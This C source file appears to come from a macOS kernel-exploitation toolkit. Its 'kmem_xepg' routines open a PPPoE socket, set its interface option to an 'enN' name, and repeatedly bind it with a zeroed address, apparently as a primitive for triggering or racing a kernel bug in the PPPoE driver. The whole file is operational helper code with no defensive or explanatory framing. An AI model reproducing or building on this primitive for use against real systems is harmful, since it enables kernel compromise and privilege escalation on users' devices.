//
//  kmem_xepg.c
//  kmem_xepg
//
//  Created by admin on 12/15/21.
//

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#include <sys/errno.h>
#include <sys/socket.h>

#include "kmem_xepg.h"


#define PPPPROTO_PPPOE 16

#define PPPOE_OPT_FLAGS             1    /* see flags definition below */
#define PPPOE_OPT_INTERFACE         2    /* ethernet interface to use (en0, en1...) */
#define PPPOE_OPT_CONNECT_TIMER     3    /* time allowed for outgoing call (in seconds) */
#define PPPOE_OPT_RING_TIMER        4    /* time allowed for incoming call (in seconds) */
#define PPPOE_OPT_RETRY_TIMER       5    /* connection retry timer (in seconds) */
#define PPPOE_OPT_PEER_ENETADDR     6    /* peer ethernet address */


struct xe_kmem_xepg {
    int fd;
};


int xe_kmem_xepg_create(xe_kmem_xepg_t* out) {
    int fd = socket(PF_PPP, SOCK_DGRAM, PPPPROTO_PPPOE);
    if (fd < 0) {
        return errno;
    }
    
    xe_kmem_xepg_t xepg = malloc(sizeof(struct xe_kmem_xepg));
    xepg->fd =  fd;
    
    *out = xepg;
    return 0;
}


int xe_kmem_xepg_execute(xe_kmem_xepg_t xepg, int index) {
    char ifname[16];
    bzero(ifname, sizeof(ifname));
    snprintf(ifname, sizeof(ifname), "en%d", index);
    
    if (setsockopt(xepg->fd, PPPPROTO_PPPOE, PPPOE_OPT_INTERFACE, ifname, sizeof(ifname))) {
        return errno;
    }
    return 0;
}

int xe_kmem_xepg_spin(xe_kmem_xepg_t xepg) {
    struct sockaddr addr;
    memset(&addr, 0, sizeof(addr));
    bind(xepg->fd, &addr, sizeof(addr));
    return 0;
}

int xe_kmem_xepg_get_fd(xe_kmem_xepg_t xepg) {
    return xepg->fd;
}


int xe_kmem_xepg_destroy(xe_kmem_xepg_t* xepgp) {
    xe_kmem_xepg_t xepg = *xepgp;
    close(xepg->fd);
    free(xepg);
    *xepgp = NULL;
    return 0;
}
